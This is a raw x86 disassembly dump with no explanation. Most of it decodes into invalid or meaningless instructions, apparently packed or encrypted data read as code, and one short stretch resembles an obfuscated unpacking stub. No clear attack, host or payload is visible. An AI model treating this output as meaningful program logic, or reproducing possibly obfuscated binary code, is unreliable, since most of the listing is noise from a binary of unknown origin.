  404961:	shr    DWORD PTR [ebx-0x6360de8e],1
  404967:	mov    WORD PTR [edi],fs
  404969:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40496a:	mov    esp,0x524aab36
  40496f:	mov    eax,esp
  404971:	sti    
  404972:	push   esi
  404973:	sub    eax,0xabc67904
  404978:	nop
  404979:	hlt    
  40497a:	jp     0x4049d4
  40497c:	xchg   edx,eax
  40497d:	in     al,dx
  40497e:	mov    ds:0x5a8c97b2,eax
  404983:	outs   dx,DWORD PTR ds:[esi]
  404984:	(bad)  
  404985:	mov    edx,0xb7d3d05e
  40498a:	pop    ebx
  40498b:	add    BYTE PTR [ebx],bl
  40498d:	and    eax,0xb1369367
  404992:	jmp    0x9549:0xaefbe936
  404999:	call   0x1dd:0x75ce3fab
  4049a0:	bound  edx,QWORD PTR [esi]
  4049a2:	inc    edi
  4049a3:	call   0x69c6a507
  4049a8:	in     eax,dx
  4049a9:	push   edx
  4049aa:	dec    ebx
  4049ab:	sbb    al,0xfd
  4049ad:	pop    eax
  4049ae:	aam    0xc6
  4049b0:	out    0xa3,al
  4049b2:	sahf   
  4049b3:	rol    DWORD PTR [esi-0x1e68810b],0xf3
  4049ba:	inc    ebx
  4049bb:	mov    WORD PTR [ecx+0x6b3007e4],cs
  4049c1:	retf   0x28b5
  4049c4:	loop   0x4049f6
  4049c6:	jg     0x404951
  4049c8:	mov    dl,cl
  4049ca:	in     eax,dx
  4049cb:	or     edx,DWORD PTR [esi]
  4049cd:	mov    bl,BYTE PTR [esi+0x57]
  4049d0:	jmp    0x1c26:0x323d7774
  4049d7:	pause  
  4049d9:	jo     0x404a4c
  4049db:	das    
  4049dc:	push   esi
  4049dd:	jnp    0x4049e1
  4049df:	rcl    DWORD PTR [edx],0x81
  4049e2:	loopne 0x4049df
  4049e4:	jge    0x4049a6
  4049e6:	sbb    eax,0x9865d67
  4049eb:	lock out dx,al
  4049ed:	test   eax,0x4cdb43e8
  4049f2:	jae    0x4049fb
  4049f4:	inc    eax
  4049f5:	icebp  
  4049f6:	jecxz  0x404a28
  4049f8:	into   
  4049f9:	popfw  
  4049fb:	push   ebx
  4049fc:	cld    
  4049fd:	adc    al,0xd1
  4049ff:	repnz std 
  404a01:	repnz and DWORD PTR [edi-0x51a11db0],esp
  404a08:	or     BYTE PTR [edx-0xafcd5a0],dl
  404a0e:	ja     0x404a34
  404a10:	jg     0x4049fd
  404a12:	not    DWORD PTR [ecx-0x75b6d1b7]
  404a18:	jmp    0x404a23
  404a1a:	rcl    BYTE PTR [eax],1
  404a1c:	jbe    0x4049a6
  404a1e:	fbld   TBYTE PTR [ebp+0x59]
  404a21:	js     0x404a42
  404a23:	push   edi
  404a24:	cmp    BYTE PTR ds:0x775c36eb,al
  404a2a:	dec    esi
  404a2b:	mov    dh,BYTE PTR [edi+0x16a20182]
  404a31:	inc    DWORD PTR [ebp+0xc]
  404a34:	jmp    0x404377
  404a39:	jmp    0x404b7e
  404a3e:	cmp    eax,0xf1133703
  404a43:	xor    ebx,ecx
  404a45:	sar    DWORD PTR [edx+esi*1+0x9],1
  404a49:	cld    
  404a4a:	cwde   
  404a4b:	mov    BYTE PTR ds:0x702124ff,cl
  404a51:	jo     0x404a6b
  404a53:	jg     0x404ac5
  404a55:	jo     0x404a96
  404a57:	cdq    
  404a58:	inc    eax
  404a59:	fadd   QWORD PTR [ecx-0x78]
  404a5c:	pop    ecx
  404a5d:	rol    DWORD PTR [ecx+0x2a28fd3],0xb6
  404a64:	test   eax,0xa60d5c4b
  404a69:	fcmovne st,st(2)
  404a6b:	add    edx,edi
  404a6d:	sti    
  404a6e:	mov    DWORD PTR [ebx],ebx
  404a70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a71:	addr16 adc edx,0xd41300e7
  404a78:	aaa    
  404a79:	ss dec ebx
  404a7b:	push   ss
  404a7c:	and    esi,edi
  404a7e:	sti    
  404a7f:	int    0x54
  404a81:	scas   al,BYTE PTR es:[edi]
  404a82:	loop   0x404a93
  404a84:	mov    al,0x6d
  404a86:	std    
  404a87:	mov    ds:0x9dd6972a,al
  404a8c:	cmp    BYTE PTR [edi],al
  404a8e:	push   ebp
  404a8f:	icebp  
  404a90:	ja     0x404ab6
  404a92:	jp     0x404ae5
  404a94:	(bad)  
  404a95:	xor    BYTE PTR [edi+esi*4+0x1e],dh
  404a99:	(bad)  
  404a9a:	and    BYTE PTR [ebp+0x18cf5cf7],ch
  404aa0:	mov    edi,0xdb496f79
  404aa5:	xchg   ebp,eax
  404aa6:	xchg   BYTE PTR ds:0xe85e9062,dh
  404aac:	(bad)  
  404aad:	ins    DWORD PTR es:[edi],dx
  404aae:	ret    0x286f
  404ab1:	xchg   edx,eax
  404ab2:	jno    0x404ac9
  404ab4:	add    al,0xad
  404ab6:	lahf   
  404ab7:	aam    0x98
  404ab9:	cwde   
  404aba:	jno    0x404ab4
  404abc:	psubusb mm7,mm2
  404abf:	xor    al,dh
  404ac1:	pop    ecx
  404ac2:	test   DWORD PTR [esi],eax
  404ac4:	dec    edi
  404ac5:	dec    ecx
  404ac6:	dec    ebp
  404ac7:	or     DWORD PTR [ebp+0x58f5b27c],edx
  404acd:	or     edi,DWORD PTR [edi-0x23f86ecb]
  404ad3:	data16 add al,0x7b
  404ad6:	sub    ah,bl
  404ad8:	les    ecx,FWORD PTR [edx+eiz*4+0x3c74813c]
  404adf:	cli    
  404ae0:	xchg   esp,eax
  404ae1:	jecxz  0x404ac3
  404ae3:	pushf  
  404ae4:	push   edx
  404ae5:	(bad)  
  404ae6:	add    BYTE PTR [eax],ch
  404ae8:	mov    ch,0x97
  404aea:	dec    eax
  404aeb:	dec    esp
  404aec:	aas    
  404aed:	inc    eax
  404aee:	cwde   
  404aef:	mov    edi,eax
  404af1:	(bad)  
  404af2:	inc    esi
  404af3:	stos   DWORD PTR es:[edi],eax
  404af4:	add    eax,0xb66e9b12
  404af9:	pop    ds
  404afa:	xchg   edx,eax
  404afb:	and    BYTE PTR [ebp-0x80],dl
  404afe:	inc    ebp
  404aff:	mov    al,ds:0x6fab64b
  404b04:	push   ds
  404b05:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  404b07:	std    
  404b08:	xchg   ebx,eax
  404b09:	adc    al,0x1e
  404b0b:	mov    dh,0x17
  404b0d:	sub    ah,BYTE PTR [eax+0x54]
  404b10:	cli    
  404b11:	shr    DWORD PTR [ecx],1
  404b13:	rol    DWORD PTR [eax+0x63],cl
  404b16:	inc    ecx
  404b17:	pop    esp
  404b18:	outs   dx,BYTE PTR ds:[esi]
  404b19:	loope  0x404b22
  404b1b:	mov    bh,0xa3
  404b1d:	mov    ecx,0xb40a96bc
  404b22:	scas   al,BYTE PTR es:[edi]
  404b23:	and    BYTE PTR [edi+0x473e180f],ah
  404b29:	mov    ebp,DWORD PTR [ecx]
  404b2b:	arpl   WORD PTR [edx],ax
  404b2d:	xor    al,0x47
  404b2f:	xor    esp,DWORD PTR [esi+0x4b]
  404b32:	jle    0x404b8a
  404b34:	enter  0xf1d8,0x13
  404b38:	push   esi
  404b39:	lods   eax,DWORD PTR ds:[esi]
  404b3a:	sub    eax,0x2aa1393d
  404b3f:	es mov esp,0x1afb4378
  404b45:	mov    cl,0x66
  404b47:	mov    WORD PTR [edx-0x50],?
  404b4a:	cmc    
  404b4b:	jecxz  0x404b33
  404b4d:	mov    ecx,0x4b1bfd30
  404b52:	mov    BYTE PTR [edx+0x64],ah
  404b55:	or     ebx,0x5232baed
  404b5b:	int3   
  404b5c:	rcl    BYTE PTR [edx-0x62],cl
  404b5f:	cmp    eax,0x37b1df93
  404b64:	inc    esp
  404b65:	fiadd  DWORD PTR [ebx]
  404b67:	clc    
  404b68:	add    al,bl
  404b6a:	inc    ecx
  404b6b:	and    BYTE PTR gs:[ecx-0x7e],ch
  404b6f:	ja     0x404bbf
  404b71:	cmp    al,0xea
  404b73:	loop   0x404b11
  404b75:	leave  
  404b76:	ret    
  404b77:	inc    edx
  404b78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b79:	xor    cl,BYTE PTR [edi]
  404b7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b7c:	and    ch,BYTE PTR [eax]
  404b7e:	mov    eax,DWORD PTR [ebp-0x10]
  404b81:	xor    eax,ecx
  404b83:	mov    ecx,DWORD PTR [ebp+0x10]
  404b86:	add    eax,esi
  404b88:	jmp    0x404ccd
  404b8d:	pop    esi
  404b8e:	adc    BYTE PTR [esi-0x8],bh
  404b91:	mov    esi,0x9ce666a6
  404b96:	es icebp 
  404b98:	xor    eax,0x8efb3214
  404b9d:	int3   
  404b9e:	and    BYTE PTR [eax+0x70],dh
  404ba1:	sbb    BYTE PTR [edi+0x70],bh
  404ba4:	jo     0x404bb1
  404ba6:	shl    BYTE PTR [eax+0x4d],1
  404ba9:	xor    BYTE PTR [ebx],0x2d
  404bac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bad:	retf   
  404bae:	aam    0x2c
  404bb0:	xor    ebx,DWORD PTR [edi]
  404bb2:	ja     0x404bf5
  404bb4:	int3   
  404bb5:	hlt    
  404bb6:	mov    ah,BYTE PTR [edx]
  404bb8:	cmp    DWORD PTR [eax],esi
  404bba:	scas   eax,DWORD PTR es:[edi]
  404bbb:	call   0xe39d424e
  404bc0:	mov    BYTE PTR [ebx-0x2164c901],cl
  404bc6:	xor    ecx,DWORD PTR [esi+ecx*1]
  404bc9:	loopne 0x404be6
  404bcb:	retf   
  404bcc:	push   eax
  404bcd:	data16 fisubr WORD PTR [ebx-0x73]
  404bd1:	ret    0x49cc
  404bd4:	xor    edx,ebp
  404bd6:	add    eax,0xf04e8954
  404bdb:	dec    esp
  404bdc:	sub    DWORD PTR [ebp-0x64b46bfd],eax
  404be2:	hlt    
  404be3:	cs cmp eax,0xbe4afe31
  404be9:	jns    0x404b9e
  404beb:	ds inc esp
  404bed:	inc    ecx
  404bee:	dec    eax
  404bef:	xchg   edx,eax
  404bf0:	xor    ah,BYTE PTR [eax+edi*2-0x3d]
  404bf4:	(bad)
  404bf9:	adc    edi,DWORD PTR [edi+esi*2-0x5b]
  404bfd:	shr    DWORD PTR [esi],0xb4
  404c00:	pop    es
  404c01:	stos   DWORD PTR es:[edi],eax
  404c02:	sti    
  404c03:	and    al,0xd7
  404c05:	jmp    0x404bea
  404c07:	lods   eax,DWORD PTR ds:[esi]
  404c08:	stos   BYTE PTR es:[edi],al
  404c09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c0a:	fimul  DWORD PTR [esp+ecx*1-0x5c]
  404c0e:	mov    edi,0x6f71fd70
  404c13:	mov    ch,0x99
  404c15:	inc    edi
  404c16:	dec    esi
  404c17:	and    al,0xa5
  404c19:	mov    BYTE PTR [edx+0x2a],ch
  404c1c:	fwait
  404c1d:	ja     0x404c22
  404c1f:	aaa    
  404c20:	loop   0x404bbe
  404c22:	je     0x404c70
  404c24:	pop    es
  404c25:	xchg   esp,eax
  404c26:	xchg   esp,eax
  404c27:	jns    0x404bdb
  404c29:	pop    es
  404c2a:	out    0x64,al
  404c2c:	leave  
  404c2d:	ret    
  404c2e:	inc    ebp
  404c2f:	jo     0x404c28
  404c31:	js     0x404c6d
  404c33:	pop    ebx
  404c34:	mov    ah,0x59
  404c36:	add    ah,BYTE PTR [edi+0x76049e1d]
  404c3c:	mov    bh,0xc9
  404c3e:	std    
  404c3f:	into   
  404c40:	inc    esp
  404c41:	or     BYTE PTR [ebp+0x42e9f30a],bl
  404c47:	push   ebp
  404c48:	sbb    edx,ecx
  404c4a:	fidiv  WORD PTR [eax+0x4e]
  404c4d:	jecxz  0x404cb5
  404c4f:	mov    WORD PTR [eax],?
  404c51:	jmp    0x404c19
  404c53:	pop    ds
  404c54:	adc    ecx,ebx
  404c56:	mov    ds:0xdd77ed9b,eax
  404c5b:	dec    esi
  404c5c:	or     esi,ebx
  404c5e:	sbb    eax,0x5950f44f
  404c63:	data16 lahf 
  404c65:	pop    es
  404c66:	rol    BYTE PTR [eax-0x19463740],0xc3
  404c6d:	aam    0xe9
  404c6f:	mov    ah,0xe4
  404c71:	push   ecx
  404c72:	stos   DWORD PTR es:[edi],eax
  404c73:	je     0x404ca1
  404c75:	sar    DWORD PTR [edi],cl
  404c77:	fst    QWORD PTR [ebx+0x21547ba5]
  404c7d:	aas    
  404c7e:	jg     0x404cfb
  404c80:	xchg   ebx,eax
  404c81:	sbb    eax,0x8e003aec
  404c86:	mov    dh,BYTE PTR [edx+0x68]
  404c89:	hlt    
  404c8a:	xchg   edi,eax
  404c8b:	shl    DWORD PTR [ecx-0x7ebe0331],0x37
  404c92:	ror    al,cl
  404c94:	jl     0x404c2b
  404c96:	ja     0x404cdf
  404c98:	ret    0x6e8
  404c9b:	jae    0x404c6a
  404c9d:	adc    edx,DWORD PTR [ecx+0x46]
  404ca0:	test   eax,0x50e7817f
  404ca5:	inc    edi
  404ca6:	retf   0x32ea
  404ca9:	jl     0x404d06
  404cab:	pop    edx
  404cac:	neg    BYTE PTR [edx+0x2047edc0]
  404cb2:	sbb    al,0x1
  404cb4:	sar    edx,cl
  404cb6:	stc    
  404cb7:	(bad)  
  404cb8:	pop    edx
  404cb9:	mov    dl,0xf2
  404cbb:	je     0x404cc2
  404cbd:	js     0x404ca3
  404cbf:	inc    eax
  404cc0:	xor    BYTE PTR [ecx-0x6e],dl
  404cc3:	mov    ds:0xdeb4fd81,eax
  404cc8:	xchg   al,cl
  404cca:	xchg   edx,eax
  404ccb:	push   cs
  404ccc:	popf   
  404ccd:	mov    DWORD PTR [ecx],eax
  404ccf:	pop    esi
  404cd0:	leave  
  404cd1:	ret    0xc
  404cd4:	push   ebp
  404cd5:	mov    ebp,esp
  404cd7:	push   ecx
  404cd8:	push   ecx
  404cd9:	sub    DWORD PTR ds:0x432e56,0x432784
  404ce3:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  404cea:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  404cf1:	and    DWORD PTR ds:0x4343fe,0x0
  404cfb:	xor    ecx,ecx
  404cfd:	add    ecx,DWORD PTR ds:0x4343fe
  404d03:	inc    ecx
  404d04:	mov    DWORD PTR ds:0x4343fe,ecx
  404d0a:	cmp    DWORD PTR ds:0x4343fe,0x26
  404d11:	jne    0x404d52
  404d17:	push   DWORD PTR [ebp-0x20]
  404d1a:	push   DWORD PTR [ebp-0x24]
  404d1d:	push   0x434402
  404d22:	push   0x43440e
  404d27:	push   DWORD PTR [ebp-0x28]
  404d2a:	push   0x6ce4
  404d2f:	push   0x479e
  404d34:	push   DWORD PTR [ebp-0xc]
  404d37:	push   DWORD PTR [ebp-0x14]
  404d3a:	push   0x7cf9
  404d3f:	push   0x1b21
  404d44:	push   0x8797
  404d49:	push   DWORD PTR [ebp-0x24]
  404d4c:	call   DWORD PTR ds:0x432cb2
  404d52:	cmp    DWORD PTR ds:0x4343fe,0x1a
  404d59:	jb     0x404cfb
  404d5f:	neg    edx
  404d61:	mov    eax,DWORD PTR [ebp-0x4]
  404d64:	push   esi
  404d65:	xor    ecx,0x4a51
  404d6b:	mov    esi,DWORD PTR [ebp-0x8]
  404d6e:	mov    edx,0x7510855
  404d73:	xor    eax,edx
  404d75:	xor    esi,edx
  404d77:	mov    ecx,0x32729c
  404d7c:	adc    DWORD PTR ds:0x43449d,0x4006
  404d86:	jmp    0x40500a
  404d8b:	popa   
  404d8c:	sahf   
  404d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d8e:	mov    fs,WORD PTR [ebx-0x6b]
  404d91:	jno    0x404e04
  404d93:	mov    al,ds:0x9719e646
  404d98:	mov    al,ds:0x2ff47462
  404d9d:	jo     0x404e0f
  404d9f:	fnstcw WORD PTR [esi+0x70]
  404da2:	jo     0x404dee
  404da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404da5:	and    bl,BYTE PTR [edx+0x29793d3c]
  404dab:	shl    BYTE PTR [eax],1
  404dad:	sbb    eax,0x7b52811b
  404db2:	sub    DWORD PTR [esi],eax
  404db4:	ds aaa 
  404db6:	adc    BYTE PTR [edi],ah
  404db8:	das    
  404db9:	or     al,0xe
  404dbb:	popa   
  404dbc:	inc    eax
  404dbd:	loope  0x404dc2
  404dbf:	out    0x23,eax
  404dc1:	enter  0x7bb2,0x96
  404dc5:	popf   
  404dc6:	cdq    
  404dc7:	dec    edi
  404dc8:	jmp    0xdb8f:0xe2aa356
  404dcf:	cmp    edx,0xffffffd4
  404dd2:	mov    ds:0x3aa43eab,eax
  404dd7:	jbe    0x404de4
  404dd9:	in     eax,dx
  404dda:	pop    DWORD PTR [esi-0x1f1a980a]
  404de0:	ret    0xcde8
  404de3:	ins    DWORD PTR es:[edi],dx
  404de4:	pop    ecx
  404de5:	std    
  404de6:	out    dx,eax
  404de7:	stos   DWORD PTR es:[edi],eax
  404de8:	pop    eax
  404de9:	and    ch,BYTE PTR ds:0x76974598
  404def:	lock cld 
  404df1:	mov    eax,ds:0x88af24d3
  404df6:	clc    
  404df7:	sub    esi,0x54
  404dfa:	(bad)  
  404dfb:	jecxz  0x404e15
  404dfd:	in     eax,dx
  404dfe:	test   eax,0x95adbdba
  404e03:	xchg   esi,eax
  404e04:	fidivr DWORD PTR [eax+0x1c0052b3]
  404e0a:	fs inc edx
  404e0c:	lock mov esi,DWORD PTR [edi+0x8]
  404e10:	cwde   
  404e11:	adc    BYTE PTR [ebp-0xb],cl
  404e14:	inc    esi
  404e15:	call   0xc8ddd4c4
  404e1a:	jge    0x404db2
  404e1c:	pop    esi
  404e1d:	imul   esp,DWORD PTR [esi],0xfffffffa
  404e20:	jbe    0x404de2
  404e22:	mov    esp,DWORD PTR cs:[edi+0x23d2c032]
  404e29:	mov    ah,0x6f
  404e2b:	jb     0x404e6a
  404e2d:	add    BYTE PTR [ebx+0x2cfdc429],ch
  404e33:	out    dx,al
  404e34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e35:	fisttp WORD PTR [eax+0x58]
  404e38:	ja     0x404e4e
  404e3a:	pop    ebp
  404e3b:	mov    edx,0x189b161d
  404e40:	dec    edi
  404e41:	pop    ds
  404e42:	mov    edx,ebx
  404e44:	sbb    BYTE PTR [edi+0x48],bl
  404e47:	cli    
  404e48:	pushf  
  404e49:	and    DWORD PTR gs:[esi],ebp
  404e4c:	test   DWORD PTR ds:0x5697aeb9,edi
  404e52:	clc    
  404e53:	or     eax,0xc3b45a7e
  404e58:	adc    eax,0x3723475a
  404e5d:	cmp    al,0xba
  404e5f:	sti    
  404e60:	xor    esi,0x47
  404e63:	cld    
  404e64:	data16 jbe 0x404e7f
  404e67:	ret    0x3b87
  404e6a:	call   0xa94cecec
  404e6f:	add    al,0x33
  404e71:	dec    edx
  404e72:	xchg   ecx,eax
  404e73:	pusha  
  404e74:	jp     0x404e94
  404e76:	(bad)  
  404e77:	retf   0x4889
  404e7a:	mov    dh,BYTE PTR [edx-0x465e17d1]
  404e80:	sbb    eax,0xcb7bfaac
  404e85:	inc    eax
  404e86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e87:	xchg   edi,eax
  404e88:	inc    edi
  404e89:	fcom   QWORD PTR [edi+0x386c04f5]
  404e8f:	ret    0x2fb7
  404e92:	loop   0x404e43
  404e94:	inc    di
  404e96:	cmc    
  404e97:	lock inc ecx
  404e99:	sub    edi,0xf08f94d6
  404e9f:	push   eax
  404ea0:	adc    al,0x66
  404ea2:	inc    esi
  404ea3:	mov    bh,0x31
  404ea5:	push   0x70539ea8
  404eaa:	call   0x6f2e:0x5f432b8f
  404eb1:	daa    
  404eb2:	mov    ss,WORD PTR ds:0xe4a99961
  404eb8:	jle    0x404e86
  404eba:	out    dx,eax
  404ebb:	adc    DWORD PTR [ecx],edx
  404ebd:	mov    ds:0xd63c1fd9,al
  404ec2:	push   ebp
  404ec3:	pop    ss
  404ec4:	test   al,0x48
  404ec6:	pop    ecx
  404ec7:	repnz fcmovu st,st(3)
  404eca:	(bad)  
  404ecb:	mov    ebx,0xa13639ef
  404ed0:	xchg   edi,eax
  404ed1:	xor    BYTE PTR [eax],0x85
  404ed4:	sub    ebp,DWORD PTR [eax]
  404ed6:	pop    eax
  404ed7:	add    dh,BYTE PTR [eax]
  404ed9:	out    dx,eax
  404eda:	mov    ebx,0xf9bf29a1
  404edf:	jno    0x404e64
  404ee1:	in     eax,dx
  404ee2:	jmp    0x32d4205
  404ee7:	dec    esi
  404ee8:	and    BYTE PTR [edx+0x36],ah
  404eeb:	xchg   cl,cl
  404eed:	add    dl,BYTE PTR [edi*2+0x7a50c00e]
  404ef4:	and    dh,dl
  404ef6:	push   0x6a
  404ef8:	xchg   ebp,eax
  404ef9:	in     al,0x42
  404efb:	ja     0x404f08
  404efd:	mov    cs,WORD PTR [edi-0xd]
  404f00:	stos   BYTE PTR es:[edi],al
  404f01:	popa   
  404f02:	jmp    0x47d3bebd
  404f07:	popa   
  404f08:	push   ecx
  404f09:	clc    
  404f0a:	fs push 0x2fd103a8
  404f10:	dec    edi
  404f11:	out    0x19,eax
  404f13:	fwait
  404f14:	inc    eax
  404f15:	xchg   esp,eax
  404f16:	adc    eax,0x95dd77ea
  404f1b:	(bad)  
  404f1c:	(bad)  
  404f1e:	loopne 0x404f3b
  404f20:	and    cl,cl
  404f22:	lea    edi,[eax]
  404f24:	pop    ss
  404f25:	loop   0x404fa1
  404f27:	push   ecx
  404f28:	xchg   ecx,eax
  404f29:	xchg   esi,eax
  404f2a:	fs pop eax
  404f2c:	sbb    al,0x9a
  404f2e:	mov    eax,0x7ea9eb84
  404f33:	(bad)  [ebp+ebp*1-0x2]
  404f37:	data16 aaa 
  404f39:	push   0x2d
  404f3b:	sbb    eax,0xeb81b8fc
  404f40:	arpl   WORD PTR fs:[edx+0x11],cx
  404f44:	out    0x60,al
  404f46:	sbb    al,0xdc
  404f48:	add    al,bh
  404f4a:	pop    edi
  404f4b:	cdq    
  404f4c:	adc    BYTE PTR [edx-0x7e],bl
  404f4f:	jne    0x404f6a
  404f51:	sahf   
  404f52:	(bad)  
  404f53:	cmp    ebp,edi
  404f55:	ins    DWORD PTR es:[edi],dx
  404f56:	push   esi
  404f57:	pop    esp
  404f58:	mov    eax,DWORD PTR [ecx+0x807fa76]
  404f5e:	int3   
  404f5f:	and    edx,esi
  404f61:	in     eax,dx
  404f62:	sub    DWORD PTR ds:0xd9404872,edx
  404f68:	push   ds
  404f69:	vpsraq xmm1{k5},xmm7,XMMWORD PTR [edi]
  404f6f:	fdivr  DWORD PTR fs:[esi-0x439f5673]
  404f76:	ss loopne 0x404faa
  404f79:	jne    0x404fa8
  404f7b:	and    al,0x3f
  404f7d:	xchg   ebx,eax
  404f7e:	mov    edx,ebx
  404f80:	div    BYTE PTR [ecx+0x68]
  404f83:	dec    esi
  404f84:	sbb    dh,0x2e
  404f87:	push   ds
  404f88:	inc    edi
  404f89:	lds    ebx,FWORD PTR [ecx+0x4d]
  404f8c:	push   edx
  404f8d:	hlt    
  404f8e:	add    ebp,ebp
  404f90:	hlt    
  404f91:	mov    ah,dl
  404f93:	je     0x404ffc
  404f95:	inc    ecx
  404f96:	or     ebx,0x434ba613
  404f9c:	leave  
  404f9d:	pop    ecx
  404f9e:	(bad)  
  404f9f:	repz iret 
  404fa1:	out    0x93,al
  404fa3:	mov    ecx,0x8db0a975
  404fa8:	bound  esp,QWORD PTR [ecx-0x1ea53eb6]
  404fae:	iret   
  404faf:	in     eax,dx
  404fb0:	or     ebp,DWORD PTR [eax+0x4c]
  404fb3:	jl     0x405013
  404fb5:	pusha  
  404fb6:	ror    DWORD PTR [edi+ebp*1+0xb22e7c0],0x60
  404fbe:	pushf  
  404fbf:	mov    al,ds:0x208da4e7
  404fc4:	pop    edx
  404fc5:	cmp    edi,esi
  404fc7:	push   cs
  404fc8:	xor    al,dh
  404fca:	and    BYTE PTR [ebx-0x4bc8d77c],al
  404fd0:	jo     0x404f6b
  404fd2:	aas    
  404fd3:	and    DWORD PTR [ecx+0x71d2623b],edi
  404fd9:	(bad)
  404fdc:	push   eax
  404fdd:	mov    bh,BYTE PTR ds:0x22b3a954
  404fe3:	(bad)  
  404fe4:	pop    ss
  404fe5:	inc    edx
  404fe6:	sar    DWORD PTR [eax+0x48],1
  404fe9:	cli    
  404fea:	cmp    dl,BYTE PTR [ebx-0x78]
  404fed:	pop    esi
  404fee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fef:	xchg   edi,eax
  404ff0:	add    bl,0xd6
  404ff3:	cmp    esi,edi
  404ff5:	ja     0x404fce
  404ff7:	dec    edx
  404ff8:	jno    0x404fbd
  404ffa:	sub    DWORD PTR [ebp+eax*1-0x7dec4dfb],edi
  405001:	xor    cl,BYTE PTR [edi-0x70345119]
  405007:	ds js  0x405044
  40500a:	add    esi,ecx
  40500c:	xor    DWORD PTR ds:0x434416,0x260
  405016:	add    eax,ecx
  405018:	imul   eax,esi
  40501b:	mov    DWORD PTR ds:0x43440a,0x336a
  405025:	mov    esi,DWORD PTR [ebp+0xc]
  405028:	mov    DWORD PTR ds:0x434416,0x44f4
  405032:	cmp    esi,eax
  405034:	mov    DWORD PTR ds:0x432e4a,0x3ddd
  40503e:	jne    0x4052de
  405044:	mov    eax,DWORD PTR [ebp-0x4]
  405047:	mov    esi,DWORD PTR [ebp-0x8]
  40504a:	xor    eax,edx
  40504c:	jmp    0x4052d0
  405051:	test   DWORD PTR [ebp+0xb],ebx
  405054:	cmp    al,0xf3
  405056:	push   0x55
  405058:	popa   
  405059:	and    DWORD PTR [esi],0x2f
  40505c:	adc    al,0x22
  40505e:	pop    ebx
  40505f:	sub    BYTE PTR [edi],cl
  405061:	pop    ebp
  405062:	sub    eax,0x7ed97070
  405067:	jo     0x4050d9
  405069:	xor    BYTE PTR [edx+0x2cf882a1],al
  40506f:	mov    ds:0xc3d9f8cc,al
  405074:	in     al,dx
  405075:	push   cs
  405076:	(bad)  
  405077:	idiv   DWORD PTR [edx]
  405079:	pop    ebp
  40507a:	or     al,0x83
  40507c:	stos   BYTE PTR es:[edi],al
  40507d:	push   ebx
  40507e:	jbe    0x405028
  405080:	and    BYTE PTR [edi+0x6afc7c0],ch
  405086:	loopne 0x40504f
  405088:	push   ebx
  405089:	daa    
  40508a:	pop    DWORD PTR [edi+0xe476b0b]
  405090:	push   0x43
  405092:	dec    edi
  405093:	js     0x4050ba
  405095:	push   esi
  405096:	call   0xb60268b9
  40509b:	call   0x8e66f7d7
  4050a0:	mov    edx,0xe1ced8d5
  4050a5:	fcmovb st,st(0)
  4050a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050a8:	loope  0x40506e
  4050aa:	fwait
  4050ab:	lea    esi,[esi-0x20943475]
  4050b1:	jmp    0x40511b
  4050b3:	aad    0x14
  4050b5:	xor    al,0x2d
  4050b7:	push   es
  4050b8:	add    ch,BYTE PTR [esi+0x19cf1495]
  4050be:	cmp    eax,0x3727b151
  4050c3:	popa   
  4050c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050c5:	and    DWORD PTR [eax],edi
  4050c7:	in     al,0x33
  4050c9:	scas   al,BYTE PTR es:[edi]
  4050ca:	popf   
  4050cb:	std    
  4050cc:	cdq    
  4050cd:	jmp    0xad99755d
  4050d2:	push   ebp
  4050d3:	pop    eax
  4050d4:	xchg   edi,eax
  4050d5:	not    DWORD PTR [ecx+0x22]
  4050d8:	loopne 0x405073
  4050da:	add    eax,0x37244c79
  4050df:	push   es
  4050e0:	mov    al,ds:0xf343e83a
  4050e5:	in     eax,dx
  4050e6:	sbb    cl,BYTE PTR [ebx+0x20]
  4050e9:	fs addr16 fwait
  4050ec:	pop    esi
  4050ed:	sbb    cl,0x3a
  4050f0:	push   ecx
  4050f1:	xchg   ebx,esi
  4050f3:	pop    es
  4050f4:	cwde   
  4050f5:	call   0xc42d1a0b
  4050fa:	and    edx,DWORD PTR [eax]
  4050fc:	xlat   BYTE PTR ds:[ebx]
  4050fd:	test   BYTE PTR [esi-0x2ed3b8d],0x41
  405104:	lea    esp,[edi-0x32]
  405107:	push   esi
  405108:	aas    
  405109:	call   0x1153f657
  40510e:	mov    edx,0xfb533a8d
  405113:	out    0x4a,al
  405115:	or     ah,ch
  405117:	jp     0x4050f1
  405119:	sub    al,0xc
  40511b:	cmp    bh,dh
  40511d:	fbld   TBYTE PTR [ebx+ecx*8]
  405120:	cmp    DWORD PTR [edi+0x2e15551f],edx
  405126:	lods   al,BYTE PTR ds:[esi]
  405127:	xchg   ebp,eax
  405128:	fisttp DWORD PTR [ebx+ebp*2]
  40512b:	(bad)  
  40512c:	dec    ecx
  40512d:	jmp    0x405192
  40512f:	shr    BYTE PTR [ecx+0x6f],1
  405132:	ret    0x7cbb
  405135:	and    eax,0x18fa30af
  40513a:	sbb    cl,BYTE PTR [edi]
  40513c:	lods   eax,DWORD PTR ds:[esi]
  40513d:	push   eax
  40513e:	dec    edi
  40513f:	mov    bh,0xe1
  405141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405142:	rcr    BYTE PTR [ebp-0x19],0x17
  405146:	mul    BYTE PTR [edi-0x4a7a6c3e]
  40514c:	int    0x5a
  40514e:	add    DWORD PTR [ebp+0x1ff26b93],esi
  405154:	lods   al,BYTE PTR ds:[esi]
  405155:	jmp    0xe16b:0x7861ff03
  40515c:	ret    
  40515d:	mov    esi,0x1c0078f3
  405162:	sbb    ebp,DWORD PTR [esi]
  405164:	pusha  
  405165:	mov    al,ds:0x14c3a20d
  40516a:	rcr    edi,cl
